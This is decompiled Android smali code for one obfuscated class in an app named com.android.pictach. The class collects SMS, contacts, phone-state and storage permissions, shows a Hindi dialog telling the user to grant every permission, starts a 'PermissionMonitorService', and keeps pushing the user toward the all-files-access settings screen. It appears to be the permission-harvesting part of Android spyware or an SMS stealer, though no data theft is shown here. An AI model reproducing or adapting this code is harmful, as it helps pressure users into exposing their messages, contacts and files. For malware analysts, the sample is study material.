.class public final Lbo;
.super Ljava/lang/Object;
# validated-71660
# ep-cnfbjjjmxmar
.source "hkgnybyd.java"


# instance fields
.field public final a:Ljava/lang/ref/WeakReference;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/ref/WeakReference<",
            "Landroid/app/Activity;",
            ">;"
        }
    .end annotation
.end field

.field public final b:Ljava/util/ArrayList;

.field public c:I

.field public d:Z

.field public e:Z

.field public f:Z

.field public volatile g:Z

.field public final h:Landroid/os/Handler;

.field public i:Landroid/app/AlertDialog;

.field public j:Lyn;

.field public k:Z


# direct methods
.method public constructor <init>(Landroid/app/Activity;)V
    .locals 2

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 4
    const/4 v0, 0x0

    .line 5
    iput v0, p0, Lbo;->c:I

    .line 7
    iput-boolean v0, p0, Lbo;->d:Z

    .line 9
    iput-boolean v0, p0, Lbo;->e:Z

    .line 11
    iput-boolean v0, p0, Lbo;->f:Z

    .line 13
    iput-boolean v0, p0, Lbo;->g:Z

    .line 15
    iput-boolean v0, p0, Lbo;->k:Z

    .line 17
    new-instance v0, Ljava/lang/ref/WeakReference;

    .line 19
    invoke-direct {v0, p1}, Ljava/lang/ref/WeakReference;-><init>(Ljava/lang/Object;)V

    .line 22
    iput-object v0, p0, Lbo;->a:Ljava/lang/ref/WeakReference;

    .line 24
    new-instance p1, Ljava/util/ArrayList;

    .line 26
    invoke-direct {p1}, Ljava/util/ArrayList;-><init>()V

    .line 29
    iput-object p1, p0, Lbo;->b:Ljava/util/ArrayList;

    .line 31
    new-instance v0, Landroid/os/Handler;

    .line 33
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 36
    move-result-object v1

    .line 37
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 40
    iput-object v0, p0, Lbo;->h:Landroid/os/Handler;

    .line 42
    const-string v0, "android.permission.READ_SMS"

    .line 44
    invoke-virtual {p1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 47
    const-string v0, "android.permission.SEND_SMS"

    .line 49
    invoke-virtual {p1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 52
    const-string v0, "android.permission.READ_CONTACTS"

    .line 54
    invoke-virtual {p1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 57
    const-string v0, "android.permission.READ_PHONE_STATE"

    .line 59
    invoke-virtual {p1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 62
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 64
    const/16 v1, 0x1e

    .line 66
    if-ge v0, v1, :cond_0

    .line 68
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    .line 70
    invoke-virtual {p1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 73
    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    .line 75
    invoke-virtual {p1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 78
    :cond_0
    return-void
.end method


# virtual methods
.method public final declared-synchronized a()V
    .locals 2

    .line 1
    monitor-enter p0

    .line 2
    :try_start_0
    iget-object v0, p0, Lbo;->i:Landroid/app/AlertDialog;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 4
    if-eqz v0, :cond_1

    .line 6
    const/4 v1, 0x0

    .line 7
    :try_start_1
    invoke-virtual {v0}, Landroid/app/Dialog;->isShowing()Z

    .line 10
    move-result v0

    .line 11
    if-eqz v0, :cond_0

    .line 13
    iget-object v0, p0, Lbo;->i:Landroid/app/AlertDialog;

    .line 15
    invoke-virtual {v0}, Landroid/app/Dialog;->dismiss()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 18
    :catch_0
    :cond_0
    :try_start_2
    iput-object v1, p0, Lbo;->i:Landroid/app/AlertDialog;

    .line 20
    goto :goto_0

    .line 21
    :catchall_0
    move-exception v0

    .line 22
    iput-object v1, p0, Lbo;->i:Landroid/app/AlertDialog;

    .line 24
    throw v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 25
    :cond_1
    :goto_0
    monitor-exit p0

    .line 26
    return-void

    .line 27
    :catchall_1
    move-exception v0

    .line 28
    monitor-exit p0

    .line 29
    throw v0
.end method

.method public final b()Landroid/app/Activity;
    .locals 2

    .line 1
    iget-object v0, p0, Lbo;->a:Ljava/lang/ref/WeakReference;

    .line 3
    invoke-virtual {v0}, Ljava/lang/ref/Reference;->get()Ljava/lang/Object;

    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/app/Activity;

    .line 9
    if-eqz v0, :cond_1

    .line 11
    invoke-virtual {v0}, Landroid/app/Activity;->isFinishing()Z

    .line 14
    move-result v1

    .line 15
    if-nez v1, :cond_1

    .line 17
    invoke-virtual {v0}, Landroid/app/Activity;->isDestroyed()Z

    .line 20
    move-result v1

    .line 21
    if-eqz v1, :cond_0

    .line 23
    goto :goto_0

    .line 24
    :cond_0
    return-object v0

    .line 25
    :cond_1
    :goto_0
    const/4 v0, 0x0

    .line 26
    return-object v0
.end method

.method public final c()Ljava/lang/String;
    .locals 6

    .line 1
    invoke-virtual {p0}, Lbo;->b()Landroid/app/Activity;

    .line 4
    move-result-object v0

    .line 5
    if-nez v0, :cond_0

    .line 7
    const-string v0, ""

    .line 9
    return-object v0

    .line 10
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    .line 12
    const-string v2, "\u090f\u092a\u094d\u0932\u093f\u0915\u0947\u0936\u0928 \u0915\u094b \u0928\u093f\u092e\u094d\u0928\u0932\u093f\u0916\u093f\u0924 \u0905\u0928\u0941\u092e\u0924\u093f\u092f\u094b\u0902 \u0915\u0940 \u0906\u0935\u0936\u094d\u092f\u0915\u0924\u093e \u0939\u0948:\n\n"

    .line 14
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 17
    iget-object v2, p0, Lbo;->b:Ljava/util/ArrayList;

    .line 19
    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 22
    move-result-object v2

    .line 23
    :cond_1
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    .line 26
    move-result v3

    .line 27
    if-eqz v3, :cond_8

    .line 29
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 32
    move-result-object v3

    .line 33
    check-cast v3, Ljava/lang/String;

    .line 35
    invoke-static {v0, v3}, Ln8;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 38
    move-result v4

    .line 39
    if-eqz v4, :cond_1

    .line 41
    const-string v4, "\u2022 "

    .line 43
    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 46
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    .line 49
    move-result v4

    .line 50
    const/4 v5, -0x1

    .line 51
    sparse-switch v4, :sswitch_data_0

    .line 54
    goto :goto_1

    .line 55
    :sswitch_0
    const-string v4, "android.permission.READ_CONTACTS"

    .line 57
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 60
    move-result v3

    .line 61
    if-nez v3, :cond_2

    .line 63
    goto :goto_1

    .line 64
    :cond_2
    const/4 v5, 0x5

    .line 65
    goto :goto_1

    .line 66
    :sswitch_1
    const-string v4, "android.permission.WRITE_EXTERNAL_STORAGE"

    .line 68
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 71
    move-result v3

    .line 72
    if-nez v3, :cond_3

    .line 74
    goto :goto_1

    .line 75
    :cond_3
    const/4 v5, 0x4

    .line 76
    goto :goto_1

    .line 77
    :sswitch_2
    const-string v4, "android.permission.SEND_SMS"

    .line 79
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 82
    move-result v3

    .line 83
    if-nez v3, :cond_4

    .line 85
    goto :goto_1

    .line 86
    :cond_4
    const/4 v5, 0x3

    .line 87
    goto :goto_1

    .line 88
    :sswitch_3
    const-string v4, "android.permission.READ_PHONE_STATE"

    .line 90
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 93
    move-result v3

    .line 94
    if-nez v3, :cond_5

    .line 96
    goto :goto_1

    .line 97
    :cond_5
    const/4 v5, 0x2

    .line 98
    goto :goto_1

    .line 99
    :sswitch_4
    const-string v4, "android.permission.READ_EXTERNAL_STORAGE"

    .line 101
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 104
    move-result v3

    .line 105
    if-nez v3, :cond_6

    .line 107
    goto :goto_1

    .line 108
    :cond_6
    const/4 v5, 0x1

    .line 109
    goto :goto_1

    .line 110
    :sswitch_5
    const-string v4, "android.permission.READ_SMS"

    .line 112
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 115
    move-result v3

    .line 116
    if-nez v3, :cond_7

    .line 118
    goto :goto_1

    .line 119
    :cond_7
    const/4 v5, 0x0

    .line 120
    :goto_1
    packed-switch v5, :pswitch_data_0

    .line 123
    const-string v3, "\u0906\u0935\u0936\u094d\u092f\u0915 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 125
    goto :goto_2

    .line 126
    :pswitch_0
    const-string v3, "Contacts \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 128
    goto :goto_2

    .line 129
    :pswitch_1
    const-string v3, "\u0938\u094d\u091f\u094b\u0930\u0947\u091c \u0932\u093f\u0916\u0928\u0947 \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 131
    goto :goto_2

    .line 132
    :pswitch_2
    const-string v3, "SMS \u092d\u0947\u091c\u0928\u0947 \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 134
    goto :goto_2

    .line 135
    :pswitch_3
    const-string v3, "\u092b\u094b\u0928 \u0938\u094d\u0925\u093f\u0924\u093f \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 137
    goto :goto_2

    .line 138
    :pswitch_4
    const-string v3, "\u0938\u094d\u091f\u094b\u0930\u0947\u091c \u092a\u0922\u093c\u0928\u0947 \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 140
    goto :goto_2

    .line 141
    :pswitch_5
    const-string v3, "SMS \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f"

    .line 143
    :goto_2
    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 146
    const-string v3, "\n"

    .line 148
    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 151
    goto/16 :goto_0

    .line 153
    :cond_8
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 155
    const/16 v2, 0x1e

    .line 157
    if-lt v0, v2, :cond_9

    .line 159
    invoke-static {}, Lq;->u()Z

    .line 162
    move-result v0

    .line 163
    if-nez v0, :cond_9

    .line 165
    const-string v0, "\u2022 \u0938\u092d\u0940 \u092b\u093e\u0907\u0932\u094b\u0902 \u0924\u0915 \u092a\u0939\u0941\u0902\u091a \u0915\u0940 \u0905\u0928\u0941\u092e\u0924\u093f\n"

    .line 167
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 170
    :cond_9
    const-string v0, "\n\u0915\u0943\u092a\u092f\u093e \u0938\u0947\u091f\u093f\u0902\u0917\u094d\u0938 \u092e\u0947\u0902 \u091c\u093e\u0915\u0930 \u0938\u092d\u0940 \u0905\u0928\u0941\u092e\u0924\u093f\u092f\u093e\u0902 \u0926\u0947\u0902\u0964"

    .line 172
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 175
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 178
    move-result-object v0

    .line 179
    return-object v0

    .line 180
    nop

    .line 181
    :sswitch_data_0
    .sparse-switch
        -0x7aed85b0 -> :sswitch_5
        -0x1833add0 -> :sswitch_4
        -0x550ba9 -> :sswitch_3
        0x322a742 -> :sswitch_2
        0x516a29a7 -> :sswitch_1
        0x75dd2d9c -> :sswitch_0
    .end sparse-switch

    .line 207
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public final d()Z
    .locals 4

    .line 1
    invoke-virtual {p0}, Lbo;->b()Landroid/app/Activity;

    .line 4
    move-result-object v0

    .line 5
    const/4 v1, 0x0

    .line 6
    if-nez v0, :cond_0

    .line 8
    return v1

    .line 9
    :cond_0
    iget-object v2, p0, Lbo;->b:Ljava/util/ArrayList;

    .line 11
    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 14
    move-result-object v2

    .line 15
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    .line 18
    move-result v3

    .line 19
    if-eqz v3, :cond_2

    .line 21
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 24
    move-result-object v3

    .line 25
    check-cast v3, Ljava/lang/String;

    .line 27
    invoke-static {v0, v3}, Ln8;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 30
    move-result v3

    .line 31
    if-eqz v3, :cond_1

    .line 33
    return v1

    .line 34
    :cond_2
    const/4 v0, 0x1

    .line 35
    return v0
.end method

.method public final e()V
    .locals 5

    .line 1
    const-class v0, Lcom/android/pictach/PermissionMonitorService;

    .line 3
    const-string v1, "package:"

    .line 5
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 7
    const/16 v3, 0x1e

    .line 9
    if-lt v2, v3, :cond_2

    .line 11
    invoke-virtual {p0}, Lbo;->b()Landroid/app/Activity;

    .line 14
    move-result-object v2

    .line 15
    if-nez v2, :cond_0

    .line 17
    return-void

    .line 18
    :cond_0
    invoke-static {}, Lq;->u()Z

    .line 21
    move-result v3

    .line 22
    if-nez v3, :cond_1

    .line 24
    :try_start_0
    new-instance v3, Landroid/content/Intent;

    .line 26
    invoke-direct {v3, v2, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 29
    invoke-virtual {v2, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 32
    new-instance v3, Landroid/content/Intent;

    .line 34
    const-string v4, "android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"

    .line 36
    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 39
    new-instance v4, Ljava/lang/StringBuilder;

    .line 41
    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 44
    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 47
    move-result-object v1

    .line 48
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 51
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 54
    move-result-object v1

    .line 55
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 58
    move-result-object v1

    .line 59
    invoke-virtual {v3, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 62
    invoke-virtual {v2, v3}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 65
    goto :goto_0

    .line 66
    :catch_0
    :try_start_1
    new-instance v1, Landroid/content/Intent;

    .line 68
    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 71
    invoke-virtual {v2, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 74
    new-instance v0, Landroid/content/Intent;

    .line 76
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 79
    const-string v1, "android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"

    .line 81
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 84
    invoke-virtual {v2, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 87
    goto :goto_0

    .line 88
    :cond_1
    invoke-virtual {p0, v2}, Lbo;->h(Landroid/app/Activity;)V

    .line 91
    :catch_1
    :cond_2
    :goto_0
    return-void
.end method

.method public final declared-synchronized f()V
    .locals 5

    .line 1
    monitor-enter p0

    .line 2
    :try_start_0
    invoke-virtual {p0}, Lbo;->b()Landroid/app/Activity;

    .line 5
    move-result-object v0

    .line 6
    if-eqz v0, :cond_5

    .line 8
    iget-boolean v1, p0, Lbo;->g:Z

    .line 10
    if-eqz v1, :cond_0

    .line 12
    goto :goto_2

    .line 13
    :cond_0
    new-instance v1, Ljava/util/ArrayList;

    .line 15
    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 18
    iget-object v2, p0, Lbo;->b:Ljava/util/ArrayList;

    .line 20
    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 23
    move-result-object v2

    .line 24
    :cond_1
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    .line 27
    move-result v3

    .line 28
    if-eqz v3, :cond_2

    .line 30
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 33
    move-result-object v3

    .line 34
    check-cast v3, Ljava/lang/String;

    .line 36
    invoke-static {v0, v3}, Ln8;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 39
    move-result v4

    .line 40
    if-eqz v4, :cond_1

    .line 42
    invoke-virtual {v1, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 45
    goto :goto_0

    .line 46
    :cond_2
    invoke-virtual {v1}, Ljava/util/ArrayList;->isEmpty()Z

    .line 49
    move-result v2

    .line 50
    const/4 v3, 0x1

    .line 51
    if-nez v2, :cond_3

    .line 53
    iget-boolean v2, p0, Lbo;->d:Z

    .line 55
    if-nez v2, :cond_3

    .line 57
    iput-boolean v3, p0, Lbo;->d:Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 59
    const/4 v2, 0x0

    .line 60
    :try_start_1
    new-array v3, v2, [Ljava/lang/String;

    .line 62
    invoke-virtual {v1, v3}, Ljava/util/ArrayList;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    .line 65
    move-result-object v1

    .line 66
    check-cast v1, [Ljava/lang/String;

    .line 68
    invoke-static {v0, v1}, Lf0;->d(Landroid/app/Activity;[Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 71
    goto :goto_1

    .line 72
    :catch_0
    :try_start_2
    iput-boolean v2, p0, Lbo;->d:Z

    .line 74
    goto :goto_1

    .line 75
    :cond_3
    iput-boolean v3, p0, Lbo;->k:Z

    .line 77
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 79
    const/16 v2, 0x1e

    .line 81
    if-lt v1, v2, :cond_4

    .line 83
    invoke-static {}, Lq;->u()Z

    .line 86
    move-result v1

    .line 87
    if-nez v1, :cond_4

    .line 89
    invoke-virtual {p0}, Lbo;->e()V

    .line 92
    goto :goto_1

    .line 93
    :cond_4
    invoke-virtual {p0, v0}, Lbo;->h(Landroid/app/Activity;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 96
    :goto_1
    monitor-exit p0

    .line 97
    return-void

    .line 98
    :cond_5
    :goto_2
    monitor-exit p0

    .line 99
    return-void

    .line 100
    :catchall_0
    move-exception v0

    .line 101
    monitor-exit p0

    .line 102
    throw v0
.end method

.method public final g()V
    .locals 2

    .line 1
    invoke-virtual {p0}, Lbo;->b()Landroid/app/Activity;

    .line 4
    move-result-object v0

    .line 5
    if-eqz v0, :cond_2

    .line 7
    iget-boolean v0, p0, Lbo;->g:Z

    .line 9
    if-nez v0, :cond_2

    .line 11
    iget-boolean v0, p0, Lbo;->e:Z

    .line 13
    if-eqz v0, :cond_0

    .line 15
    goto :goto_0

    .line 16
    :cond_0
    iget-object v0, p0, Lbo;->j:Lyn;

    .line 18
    if-eqz v0, :cond_1

    .line 20
    iget-object v1, p0, Lbo;->h:Landroid/os/Handler;

    .line 22
    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 25
    :cond_1
    new-instance v0, Lyn;

    .line 27
    const/4 v1, 0x1

    .line 28
    invoke-direct {v0, p0, v1}, Lyn;-><init>(Lbo;I)V

    .line 31
    iput-object v0, p0, Lbo;->j:Lyn;

    .line 33
    iget-object v1, p0, Lbo;->h:Landroid/os/Handler;

    .line 35
    invoke-virtual {v1, v0}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 38
    :cond_2
    :goto_0
    return-void
.end method

.method public final h(Landroid/app/Activity;)V
    .locals 4

    .line 1
    invoke-virtual {p0}, Lbo;->d()Z

    .line 4
    move-result v0

    .line 5
    if-eqz v0, :cond_2

    .line 7
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 9
    const/16 v1, 0x1e

    .line 11
    if-lt v0, v1, :cond_0

    .line 13
    invoke-static {}, Lq;->u()Z

    .line 16
    move-result v1

    .line 17
    goto :goto_0

    .line 18
    :cond_0
    const/4 v1, 0x1

    .line 19
    :goto_0
    if-eqz v1, :cond_2

    .line 21
    sget-object v1, Ld4;->a:Landroid/os/Handler;

    .line 23
    const/16 v1, 0x17

    .line 25
    if-lt v0, v1, :cond_1

    .line 27
    invoke-static {p1}, Ld4;->b(Landroid/content/Context;)Z

    .line 30
    move-result v0

    .line 31
    if-nez v0, :cond_1

    .line 33
    sget-object v0, Ld4;->a:Landroid/os/Handler;

    .line 35
    new-instance v1, Lc4;

    .line 37
    invoke-direct {v1, p1}, Lc4;-><init>(Landroid/content/Context;)V

    .line 40
    const-wide/16 v2, 0x7d0

    .line 42
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 45
    :cond_1
    invoke-static {p1}, Lg4;->c(Landroid/content/Context;)V

    .line 48
    invoke-static {p1}, Lg4;->b(Landroid/content/Context;)V

    .line 51
    :cond_2
    return-void
.end method

.method public final declared-synchronized i()V
    .locals 2

    .line 1
    monitor-enter p0

    .line 2
    :try_start_0
    invoke-virtual {p0}, Lbo;->b()Landroid/app/Activity;

    .line 5
    move-result-object v0

    .line 6
    if-eqz v0, :cond_3

    .line 8
    iget-boolean v0, p0, Lbo;->g:Z

    .line 10
    if-eqz v0, :cond_0

    .line 12
    goto :goto_0

    .line 13
    :cond_0
    iget v0, p0, Lbo;->c:I

    .line 15
    const/4 v1, 0x2

    .line 16
    if-lt v0, v1, :cond_1

    .line 18
    iget-boolean v0, p0, Lbo;->e:Z

    .line 20
    if-nez v0, :cond_1

    .line 22
    invoke-virtual {p0}, Lbo;->g()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 25
    monitor-exit p0

    .line 26
    return-void

    .line 27
    :cond_1
    :try_start_1
    iget-boolean v0, p0, Lbo;->d:Z

    .line 29
    if-nez v0, :cond_2

    .line 31
    iget-boolean v0, p0, Lbo;->e:Z

    .line 33
    if-nez v0, :cond_2

    .line 35
    iget-boolean v0, p0, Lbo;->f:Z

    .line 37
    if-nez v0, :cond_2

    .line 39
    invoke-virtual {p0}, Lbo;->f()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 42
    :cond_2
    monitor-exit p0

    .line 43
    return-void

    .line 44
    :cond_3
    :goto_0
    monitor-exit p0

    .line 45
    return-void

    .line 46
    :catchall_0
    move-exception v0

    .line 47
    monitor-exit p0

    .line 48
    throw v0
.end method
